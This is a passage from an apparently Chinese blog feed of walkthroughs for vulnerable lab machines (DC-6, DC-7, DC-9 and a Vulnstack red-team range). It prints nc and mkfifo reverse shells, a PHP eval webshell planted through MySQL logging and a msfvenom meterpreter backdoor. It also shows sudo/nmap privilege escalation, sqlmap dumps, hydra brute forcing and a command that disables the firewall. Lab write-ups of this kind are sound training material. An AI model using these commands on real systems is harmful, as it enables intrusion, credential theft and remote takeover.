src="/assets/Dkali%E5%8F%8D%E5%BC%B9sehll-20231016165007-e38c173.png" alt="Dkali反弹sehll">​</p><p>#水平越权—sudo -l</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">存在jens可以无密码执行/home/jens/backups.sh</span><br><span class="line">graham下存在一个jens无密码就可以运行的.sh</span><br><span class="line">#！/bin/bash</span><br><span class="line"></span><br><span class="line">cat /home/</span><br><span class="line">#提权</span><br><span class="line">echo &#x27;/bin/bash&#x27; &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line">sudo -u jens ./backups.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dmark%E4%B8%8B%E6%8F%90%E7%A4%BA-20231016165013-ttzz8je.png" alt="Dmark下提示"></p><p>​​<img src="/assets/Dssh-graham@-20231016165029-ihdpt6f.png" alt="Dssh-graham@"></p><p>​​<img src="/assets/D%E4%BD%8E%E6%9D%83%E9%99%90graham%E6%8F%90%E6%9D%83-20231016165058-ir83db4.png" alt="D低权限graham提权">​</p><p>#nmap提权 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">存在root无密码运行nmap</span><br><span class="line">‍‍```</span><br><span class="line">  namp提权</span><br><span class="line">‍‍```</span><br><span class="line"></span><br><span class="line">echo &#x27;os.execute(&quot;/bin/sh&quot;)&#x27; &gt; getShell</span><br><span class="line">sudo  nmap  --script=getShell</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">-&gt;root</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Djens%E7%9A%84shell-20231016165105-rjj8mp0.png" alt="Djens的shell">​</p><p>#FLAG</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/theflag.txt</span><br></pre></td></tr></table></figure><p>​<img src="/assets/Dnmap%E6%8F%90%E6%9D%83flag-20231016165111-ipzo8pk.png" alt="Dnmap提权flag">​</p><p>‍</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-7</title>
      <link href="/2024/04/11/DC/DC-7/"/>
      <url>/2024/04/11/DC/DC-7/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-7"><a href="#DC-7" class="headerlink" title="DC-7"></a>DC-7</h1><p>#主机探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpscan -l</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7arpscan-20231017150328-rvmhtyp.png" alt="D7arpscan">​</p><p>#端口探测 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F T4 -sS -sV 1192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-nmap-20231017150338-ve5hj9i.png" alt="D7-nmap">​</p><p>#指纹识别 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.11 </span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-%E6%8F%92%E4%BB%B6-20231017150345-qxso63d.png" alt="D7-插件"></p><p>​​<img src="/assets/D7-whatweb-20231017150357-5iuuhxs.png" alt="D7-whatweb">​</p><p>#目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-dirsearch-20231017150402-b070as6.png" alt="D7-dirsearch">​</p><p>#web页面 </p><p>#drupal 8.7.6版本 –DC7USER–github源码–得到账密</p><p>​![屏幕截图 2023-10-17 145609](assets&#x2F;屏幕截图 2023-10-17 145609-20231017150411-5tl1kdc.png)</p><p>​</p><p>​<img src="/assets/D7-8.7.6-20231017150418-6vqj711.png" alt="D7-8.7.6">​</p><p>#ssh登录 —You have mail</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh dc7user@192.168.43.11</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-ssh-20231017150427-yi10abb.png" alt="D7-ssh"></p><p>​​<img src="/assets/D7-ssh2-20231017150439-bglmukf.png" alt="D7-ssh2">​</p><p>#查看mail </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure><p>‍</p><p>#&#x2F;opt&#x2F;scripts&#x2F;backups.sh </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个定时任务</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-var.html-20231017150444-qr144nv.png" alt="D7-var.html">​</p><p>#改admin 密码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin  --password=&quot;admin&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-gai%E5%AF%86%E7%A0%81-20231017150450-es1dwb7.png" alt="D7-gai密码">​</p><p>#登录web界面 –上🐎子 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php system(&#x27;nc -e /bin/bash 192.168.43.33 8888&#x27;) ?&gt;</span></span><br><span class="line"></span><br><span class="line">kali:</span><br><span class="line">nc -lvvp 8888</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><p>#kali反弹shell  —www-data</p><p>​<img src="/assets/D7-web%F0%9F%90%8E%E5%AD%90-20231017150457-ejtgksa.png" alt="D7-web🐎子"></p><p>​</p><p>​![D7-kali-NC (2)](assets&#x2F;D7-kali-NC 2-20231017150511-38fu6zy.png)​</p><p>#提权root</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lvvp 9998</span><br><span class="line">www-data:</span><br><span class="line">echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.43.33 9998 &gt;/tmp/f&quot; &gt;&gt; backups.sh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D7-%E6%8F%90%E6%9D%83-20231017150518-dzw3nov.png" alt="D7-提权"></p><p>​​![屏幕截图 2023-10-17 144414](assets&#x2F;屏幕截图 2023-10-17 144414-20231017150530-rjnwlx2.png)​</p><p>#FLAG</p><p>​<img src="/assets/D-flag-20231017150535-fw7evev.png" alt="D-flag">​</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC靶机-9</title>
      <link href="/2024/04/11/DC/DC-9/"/>
      <url>/2024/04/11/DC/DC-9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="DC-9"><a href="#DC-9" class="headerlink" title="DC-9"></a>DC-9</h1><p>#主机探测-端口扫描 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line">nmap -F -T4 -sS 192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-1+2-20231018170338-0xave2p.png" alt="D9-1+2">​</p><p>‍</p><p>#指纹识别-目录爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">whatweb 192.168.43.13</span><br><span class="line">dirsearch -u 192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-3+4-20231018170651-sqyhz4x.png" alt="D9-3+4">​</p><p>#web界面</p><p>#直接AWVS跑–存在sql注入漏洞–result.php</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search存在注入漏洞</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-18 160941](assets&#x2F;屏幕截图 2023-10-18 160941-20231018170701-dn4z7xq.png)​</p><p>#sqlmap梭哈 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -dbs</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;users&#x27; --tables</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;users&#x27; -T &#x27;UserDetails&#x27; --dump</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://192.168.43.13/results.php&quot; -data &quot;search=1&quot; -D &#x27;Staff&#x27; -T &#x27;users&#x27; --dump</span><br><span class="line"></span><br><span class="line">#把得到的账密保存下来，为后续ssh爆破做准备</span><br><span class="line">#存在一串密文“856f5de590ef37314e7c3bdf6f8a66dc ”  MD5解密---transorbital1</span><br><span class="line">#解密网站：https://www.somd5.com/</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-Staff-%E5%AD%97%E6%AE%B5-20231018170909-0j5cp5q.png" alt="D9-Staff-字段">​</p><p>​<img src="/assets/D9-%E5%AD%97%E6%AE%B5-20231018170909-lqxotjy.png" alt="D9-字段">​</p><p>​<img src="/assets/D9-%E5%BA%93-20231018170909-ddrmari.png" alt="D9-库">​</p><p>​<img src="/assets/D9-%E8%A1%A8-20231018170909-90mguff.png" alt="D9-表">​</p><p>‍</p><p>#登录web账密 </p><p>‍</p><p>​<img src="/assets/D9-%E7%99%BB%E5%BD%95-20231018170935-vu3hndz.png" alt="D9-登录">​</p><p>#存在任意文件读取漏洞</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#页面底部存在 “File does not exist&quot;</span><br><span class="line">#可能存在任意文件读取漏洞</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E5%AD%98%E5%9C%A8%E9%97%AE%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-20231018170949-et5h5yv.png" alt="D9-存在问文件包含漏洞">​</p><p>#查看knock配置文件 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#由于之前nmap扫描时，22端口为filter状态，猜测应该是knock这个服务存在</span><br><span class="line">#利用file协议</span><br><span class="line">#?file=../../../../../../etc/knock.conf</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-kncok%E9%85%8D%E7%BD%AE-20231018170955-ktkhcnz.png" alt="D9-kncok配置">​</p><p>#海德拉爆破ssh账密</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#将之前保存下来的账密作为字典</span><br><span class="line">hydra -L user.txt -P miam.txt 192.168.43.13 ssh</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E6%B5%B7%E5%BE%B7%E6%8B%89-20231018171303-00t84z5.png" alt="D9-海德拉">​</p><p>#三个用户ssh</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">joerty,chandleb,janitor</span><br><span class="line">ssh joerty#192.168.43.13</span><br><span class="line">ssh chandleb@192.168.43.13</span><br><span class="line">ssh janitor@192.168.43.13</span><br></pre></td></tr></table></figure><p>​![屏幕截图 2023-10-18 152842](assets&#x2F;屏幕截图 2023-10-18 152842-20231018171319-xtiolia.png)​</p><p>​![屏幕截图 2023-10-18 152923](assets&#x2F;屏幕截图 2023-10-18 152923-20231018171319-8q8z3cp.png)​</p><p>​![屏幕截图 2023-10-18 152955](assets&#x2F;屏幕截图 2023-10-18 152955-20231018171319-nqylfen.png)​</p><p>#janitor存在多余目录</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看此目录--存在密码--追加miam.txt</span><br><span class="line">echo XXX,XXX,XXX &gt;&gt; miam.txt</span><br></pre></td></tr></table></figure><p>‍</p><p>#二次爆破 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L user.txt -P miam.txt</span><br><span class="line">#得到jerey账密</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E7%88%86%E7%A0%B4%E6%96%B0%E7%9A%84ssh-20231018171425-7whsdu9.png" alt="D9-爆破新的ssh">​</p><p>#ssh登录 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jerey@192.168.43.13</span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E7%99%BB%E5%BD%95fredf-20231018171438-95du81r.png" alt="D9-登录fredf">​</p><p>#提权 </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#寻找提权方法</span><br><span class="line">sudo -l</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/opt/.../test/test下存在无密码可执行root权限文件</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<img src="/assets/D9-%E5%AF%BB%E6%89%BE%E6%8F%90%E6%9D%83-20231018171504-8fjhrwz.png" alt="D9-寻找提权">​</p><p>#FLAG </p><p>​<img src="/assets/FLAG-20231018171510-74pdrig.png" alt="FLAG">​</p>]]></content>
      
      
      <categories>
          
          <category> DC靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC靶机 </tag>
            
            <tag> 渗透测试 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATK—CK红队评估实战靶场一</title>
      <link href="/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/"/>
      <url>/2024/04/11/hrbc/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA01/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="红日靶场01"><a href="#红日靶场01" class="headerlink" title="红日靶场01"></a>红日靶场01</h1><h2 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h2><ul><li>红日靶场：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></li><li>靶机通用密码：hongrisec@2019</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">kali+CS</span><br><span class="line">192.168.43.33</span><br><span class="line">win7----admin@123</span><br><span class="line">外网：192.168.43.17</span><br><span class="line">内网：192.168.52.143</span><br><span class="line">可以Ping通外网</span><br><span class="line">通192.168.52.138（win2008）</span><br><span class="line">通192.168.52.141（win2003）</span><br><span class="line">小皮必须是自带的，下载的新版本会导致kali机连接目标失败</span><br><span class="line">问题原理：自行理解</span><br><span class="line">win2008---admin@123</span><br><span class="line">192.168.52.138</span><br><span class="line">win2003---admin@123</span><br><span class="line">192.168.52.141</span><br><span class="line">内网两台不出网win互通</span><br><span class="line">win7开启phpstudy</span><br><span class="line">win11访问80端口得到phpstudy探针</span><br></pre></td></tr></table></figure><p>​<img src="/assets/win2003-20231108121255-76cuk9q.png" alt="win2003">​</p><p>​<img src="/assets/win2008-20231108121255-inn925g.png" alt="win2008">​</p><p>​<img src="/assets/win7Ping-20231108121255-qoxgbul.png" alt="win7Ping">​</p><h2 id="二、外网渗透"><a href="#二、外网渗透" class="headerlink" title="二、外网渗透"></a>二、外网渗透</h2><h3 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h3><h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p -min-rate 10000 192.168.43.17</span><br><span class="line">#发现开启了80，3306端口</span><br><span class="line">#访问发现80端口是php探针</span><br><span class="line">#得到了探针的绝对路径 C：/phpst2016/WWW/l.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/php%E6%8E%A2%E9%92%88-20231108124630-5z3tf6e.png" alt="php探针">​</p><p>‍</p><h4 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://192.168.43.17</span><br><span class="line">#出了一些有用信息</span><br><span class="line">#phpMyadmin，phpinfo.php，l.php，</span><br></pre></td></tr></table></figure><p>​<img src="/assets/dirsearch-20231108124646-6khj2vm.png" alt="dirsearch"></p><h4 id="访问phpMyadmin"><a href="#访问phpMyadmin" class="headerlink" title="访问phpMyadmin"></a>访问phpMyadmin</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#发现是一个后台界面</span><br><span class="line">#直接弱口令登录成功</span><br><span class="line">root root</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E5%90%8E%E5%8F%B0%E7%99%BB%E9%99%86-20231108124913-qzbjp5y.png" alt="后台登陆">​</p><h4 id="弱口令登录成功"><a href="#弱口令登录成功" class="headerlink" title="弱口令登录成功"></a>弱口令登录成功</h4><p>​<img src="/assets/%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95-20231108125036-t2su0pu.png" alt="弱口令登录">​</p><h4 id="拿到webshell"><a href="#拿到webshell" class="headerlink" title="拿到webshell"></a>拿到webshell</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#通过日志文件写入一句话来获取webshell：</span><br><span class="line">#写入webshell-网站根目录下shell,把日志log改为php</span><br><span class="line">SET global general_log = &#x27;ON&#x27;</span><br><span class="line">SET global general_log_file= &#x27;C:/phpst2016/WWW/shell.php&#x27;</span><br><span class="line">select &quot;<span class="meta">&lt;?php eval($_POST[&#x27;111&#x27;]);?&gt;</span>&quot;</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E6%94%B9-20231108125207-didoz7l.png" alt="改">​​​</p><p>​<img src="/assets/%E6%94%B92-20231108125207-1d7c8nd.png" alt="改2">​</p><p>​​<img src="/assets/%E4%B8%8A%E5%B0%8F%E9%A9%AC-20231108125302-7jvh9d9.png" alt="上小马">​​​​</p><h4 id="蚁剑连接shell-php"><a href="#蚁剑连接shell-php" class="headerlink" title="蚁剑连接shell.php"></a>蚁剑连接shell.php</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#打开蚁剑</span><br><span class="line">#新建连接</span><br><span class="line">#输入URL：http://192.168.43.17/shell.php</span><br><span class="line">#输入密码：111</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5%E6%88%90%E5%8A%9F-20231108125418-6hb04x9.png" alt="蚁剑链接成功">​</p><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#发现目标存在yxcms，尝试访问</span><br><span class="line">#在首页发现了后台地址和管理员账密</span><br></pre></td></tr></table></figure><p>​![YXCMS (2)](assets&#x2F;YXCMS 2-20231108125832-qjzn04w.png)​</p><p>​<img src="/assets/YXCMS-20231108125841-py8fplq.png" alt="YXCMS">​</p><h4 id="进入yxcms后台"><a href="#进入yxcms后台" class="headerlink" title="进入yxcms后台"></a>进入yxcms后台</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#网址输入：http://192.168.43.17/yxcms/index.php?r=admin</span><br><span class="line">#admin </span><br><span class="line">#123456</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0-20231108130129-fx2aroz.png" alt="进入后台">​</p><h4 id="利用文件上传"><a href="#利用文件上传" class="headerlink" title="利用文件上传"></a>利用文件上传</h4><p>​<img src="/assets/CMS%E9%A9%AC%E5%AD%90-20231108130339-1md5n1o.png" alt="CMS马子">​</p><h4 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#小提一下，马子上传了，不知道马子绝对路径怎么办？</span><br><span class="line">#前面我们不是发现phpstudy文件夹下存在beifen.rar</span><br><span class="line">#猜测应该是yxcms的备份文件</span><br><span class="line">#解压之后，可通过查找acomment.php文件来确定文件上传的路径</span><br><span class="line">#/yxcms/protected/apps/default/view/default</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/%E5%90%8E%E5%8F%B0%E6%A8%A1%E6%9D%BF%E4%B8%8A%E9%A9%AC%E5%AD%90-20231108130559-655iw0x.png" alt="后台模板上马子"><br>​<img src="/assets/%E9%A9%AC%E5%AD%90%E8%B7%AF%E5%BE%84-20231108130558-7k8qslr.png" alt="马子路径"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#URl:http://192.168.43.17/yxcms/protected/apps/default/view/default/cmsshell.php</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E9%93%BE%E6%8E%A5CMS%E9%A9%AC%E5%AD%90-20231108130418-wlgpkdo.png" alt="蚁剑链接CMS马子">​</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">至此，已经拿到Webshell</span><br></pre></td></tr></table></figure><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><p>后渗透阶段，当我们已经将小马上传到web服务器上时，可以用webshell管理工具进行下一步渗透了。</p><h3 id="蚁剑终端关闭win7防火墙"><a href="#蚁剑终端关闭win7防火墙" class="headerlink" title="蚁剑终端关闭win7防火墙"></a>蚁剑终端关闭win7防火墙</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#关闭win防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off </span><br><span class="line">#查看防火墙配置状态</span><br><span class="line">netsh advfirewall show allprofile state </span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E8%9A%81%E5%89%91%E5%85%B3%E9%97%ADwin7%E9%98%B2%E7%81%AB%E5%A2%99-20231108131344-jkiym04.png" alt="蚁剑关闭win7防火墙">​</p><p>​<img src="/assets/win%E9%98%B2%E7%81%AB%E5%A2%99%E5%85%B3%E9%97%ADkali%E6%9C%BAPing%E9%80%9A-20231108131352-ujgflvh.png" alt="win防火墙关闭kali机Ping通">​</p><h3 id="msf生成exe并开启监听"><a href="#msf生成exe并开启监听" class="headerlink" title="msf生成exe并开启监听"></a>msf生成exe并开启监听</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#kali创建后门程序</span><br><span class="line">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.43.33 LPORT=10888 -f exe -o 233.exe </span><br><span class="line"></span><br><span class="line">#蚁剑上传233.exe</span><br><span class="line">#蚁剑终端运行233.exe</span><br><span class="line"></span><br><span class="line">#kali开启监听，设置sessions</span><br><span class="line">use exp/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp </span><br><span class="line">set lhost 192.168.43.33</span><br><span class="line">set lport 10888</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>​​<img src="/assets/233-20231108131821-bkf4y4q.png" alt="233">​</p><p><img src="/assets/msf%E7%94%9F%E6%88%90%E9%A9%AC%E5%AD%90%E7%9B%91%E5%90%AC%E4%B8%8A%E7%BA%BF-20231108131514-7njizs6.png" alt="msf生成马子监听上线"></p><h3 id="拿到win7shell"><a href="#拿到win7shell" class="headerlink" title="拿到win7shell"></a>拿到win7shell</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#尝试提权   </span><br><span class="line">#因为是administrator用户，</span><br><span class="line">#所以很容易提权成功。</span><br><span class="line">shell</span><br><span class="line">getuid</span><br><span class="line">getsystem</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure><p>​<img src="/assets/%E7%AE%80%E5%8D%95%E6%8F%90%E6%9D%83sys32-20231108132027-acolb2r.png" alt="简单提权sys32">​</p><h3 id="利用msf进行内网信息收集"><a href="#利用msf进行内网信息收集" class="headerlink" title="利用msf进行内网信息收集"></a>利用msf进行内网信息收集</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001         ---可解决乱码问题</span><br><span class="line">route print        ---锁定内网C段</span><br><span class="line">net time /domain   ---锁定域控192.168.52.138</span><br><span class="line">net user /domain   ---锁定域内五个账户</span><br><span class="line">ipconfig /all      ---锁定域名</span><br><span class="line">net view           ---锁定域内主机</span><br><span class="line">net group &quot;domain admins&quot; /domain     ---查询域管理员</span><br><span class="line"></span><br><span class="line">------------</span><br><span class="line">域名：god.org</span><br><span 